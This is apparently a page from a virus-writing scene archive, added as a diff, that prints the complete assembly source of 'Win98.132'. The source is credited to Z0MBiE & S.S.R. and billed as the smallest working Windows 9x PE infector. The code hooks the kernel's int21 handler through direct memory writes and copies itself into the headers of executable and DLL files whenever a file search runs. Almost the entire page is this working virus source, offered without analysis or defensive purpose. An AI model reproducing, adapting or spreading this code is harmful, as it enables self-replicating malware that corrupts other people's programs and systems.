@@ -1,0 +1,230 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<base target="_self">
+</head>
+
+<body topmargin="0" leftmargin="0" bgcolor="#E7BE7B" link="#CC0000" vlink="#993300" alink="#FF9900">
+
+<Table border="0" cellPadding="0" cellSpacing="0" width="100%">
+        <Tr>
+                <Td valign="top" height="33">
+                        <Img src="../images/index_08.gif" width="6" height="33"></Td>
+                <Td width="100%" background="../images/index_09.gif" valign="top" height="33">
+            <img border="0" src="../images/kolesiko.gif" align="absmiddle" width="21" height="33"><font face="Arial" size="2"><b>
+Win98.132
+            </b> - 13:10 - <i>by z0mbie&SSR</i></font>
+            </font></Td>
+                <Td valign="top" height="33">
+                        <Img src="../images/index_10.gif" width="10" height="33"></Td>
+     </Tr>
+     <Tr>
+                <Td background="../images/index_17.gif">
+            &nbsp;</Td>
+                <Td width="100%" bgcolor="#E7BE7B">
+            <font face="Courier" size="3">
+<pre>
+; 
+; win98.132 -- the smallest fully working win9x PE infector in the world
+; (x) 28-09-2000 Z0MBiE & S.S.R. -- greetz to VX scene
+; 
+
+; kernel-resident, PE-EXE/DLL header infector
+
+; virus:
+; BFF708C1 xx           xxx
+; kernel_int21:
+; BFF712B9 51           push    ecx          ; 00
+; BFF712BA 50           push    eax          ; 01
+; BFF712BB 68 002A0010  push    002A0010h    ; 02 03 04 05 06
+; BFF712C0 E8 0000010F  call    kernel_ord0  ; 07 08 09 0A 0B
+;              <----------------------- kernel_i21x=8, kernel_c1=10Fh
+; BFF712C5 C3           ret                  ; 0C
+; kernel_ord0:
+; BFF713D4 ..           ...
+
+bufsize                 equ     4096
+
+kernel_myaddr           equ     0BFF708C1h      ; only byte1 may be changed
+kernel_ord0             equ     0BFF713D4h
+kernel_int21            equ     0BFF712B9h
+kernel_i21x             equ     8
+kernel_c1               equ     (kernel_ord0-(kernel_int21+kernel_i21x+4))
+
+                        p386
+                        model   flat
+
+                        .code
+
+start:
+                        dd      kernel_int21    ; B9 12 F7 BF -- mov ecx, ...
+                        db      'Z'             ; (c)
+
+                        xchg    edi, eax
+                        ; eax=0, edi=entrypoint
+
+                        mov     al, 0A7h ; a little bit greater than physsize
+
+                        push    eax             ; count
+                        push    edi             ; src
+                        push    dword ptr [edi+c_kernel_myaddr-start] ; dest
+
+                        add     edi, [edi+eax-0A7h+physsize+4] ; edi += oldeip
+
+                        mov     edx, esp
+                        int     2Eh     ; EAX=0A7h--RtlMoveMemory
+; output: EDX=virstart-1(DL=FF), EAX=firstvirbyte=0xB9
+
+                        pop     ecx
+                        push    kernel_myaddr+hook-start-(kernel_int21+kernel_i21x+4) ; dword-value
+                        mov     ch, 12h
+                        push    ecx  ; dest, [kernel_int21+kernel_i21x]
+
+                        add     al, 0BEh-0B9h
+
+                        mov     edx, esp
+                        int     2Eh     ; EAX=0BEh--WRITE_REGISTER_ULONG
+                        ; edx=ADDR, eax=VALUE
+
+                        jmp     edi
+
+                        ; now in ring-3
+
+hook:                   cmp     al, 4Eh                 ; hook findfirst
+                        jne     hookexit
+
+infect:                 pusha                           ; save regs
+                        enter   bufsize+256, 0          ; push ebp/mov ebp,esp/sub esp,bufsize
+
+                        mov     esi, kernel_myaddr
+c_kernel_myaddr         equ     dword ptr $-4
+
+                        mov     ax, 3D02h               ; openfile, r/w
+                        call    [esi]                   ; int21
+                        jc      infect_exit
+                        xchg    ebx, eax                ; EBX = file handle
+
+                        mov     ch, bufsize/256  ; ecx==cl --> ECX=bufsize+CL
+
+                        mov     edx, esp                ; EDX=offset buf
+
+                        mov     ah, 3Fh                 ; read buffer
+                        call    [esi]                   ; int21
+
+                        mov     ecx, [edx+3Ch]          ; ECX = mz.pe_ptr
+                        cmp     ecx, eax                ; EAX = numread
+                        jae     infect_close
+
+                        add     ecx, edx               ; ECX=PE header offset
+
+                        mov     eax, [ecx+54h]          ; pe_headersize
+                        inc     [ecx+54h].byte ptr 1    ; pe_headersize+=256
+                        lea     edi, [edx+eax]  ; EDI=our new location in buf
+                        xchg    eax, [ecx+28h]       ; EAX <--> entrypointrva
+                        sub     eax, [ecx+28h]
+                        jle     infect_close   ; alredy?
+
+                        push    physsize/4
+                        pop     ecx
+
+                        pusha
+
+                        xor     eax, eax
+                        repz    scasd                   ; should be 0s
+                        jne     infect_close   ; it's allright. 'leave' there
+
+                        cdq
+
+                        mov     ah, 42h                 ; AX=4200--seek begin
+                        call    [esi]                   ; int21
+
+                        popa
+
+                        push    esi
+                        rep     movsd                   ; copy virus to buf
+                        pop     esi
+
+                        scasd                           ; EDI += 4
+                        stosd                           ; store oldeip
+
+                        mov     ch, bufsize/256         ; ECX = bufsize
+
+                        mov     ah, 40h                 ; write virus
+                        call    [esi]                   ; int21
+
+infect_close:
+                        mov     ah, 3Eh                 ; close file
+                        call    [esi]                   ; int21
+
+infect_exit:
+                        leave                         ; mov esp,ebp / pop ebp
+                        popa                            ; restore regs
+
+hookexit:               db      0E9h                  ; return to kernel_ord0
+                        dw      kernel_ord0-(kernel_myaddr+($+4-start))
+
+codesize                equ     $-start
+physsize                equ     ((codesize+3) and (not 3))
+
+                        org     start+physsize
+
+                        dd      0
+                        dd      rt-start
+
+entry:                  int 3
+
+                        lea     eax, start
+                        jmp     eax
+
+rt:                     int 3
+
+                        mov     eax, 3000h
+                        mov     ebx, kernel_int21
+                        call    ebx
+
+                        nop
+
+                        push    -1
+                        extern  ExitProcess:PROC
+                        call    ExitProcess
+
+                        .data
+
+  db      3 dup (13,10),'--------------------------',13,10
+  db      'ю codesize = '
+  db      codesize/ 100 mod 10+'0'
+  db      codesize/  10 mod 10+'0'
+  db      codesize/   1 mod 10+'0'
+  db      ' bytes',13,10
+  db      'ю physsize = '
+  db      physsize/ 100 mod 10+'0'
+  db      physsize/  10 mod 10+'0'
+  db      physsize/   1 mod 10+'0'
+  db      ' bytes',13,10
+  db      '--------------------------',4 dup (13,10)
+
+                        end     start
+</pre>
+</font>
+</Td>
+                <Td background="../images/index_19.gif">
+            &nbsp;</Td>
+        </Tr>
+        <Tr>
+                <Td>
+                        <Img src="../images/index_44.gif" width="6" height="9"></Td>
+                <Td background="../images/index_45.gif" height="9">
+            <img border="0" src="../images/spacer.gif" width="9" height="9"></Td>
+                <Td>
+                        <Img src="../images/index_46.gif" width="10" height="9"></Td>
+        </Tr>
+</Table>
+<br>
+
+</Table>
+&nbsp;
+
+</body>
+
+</html>
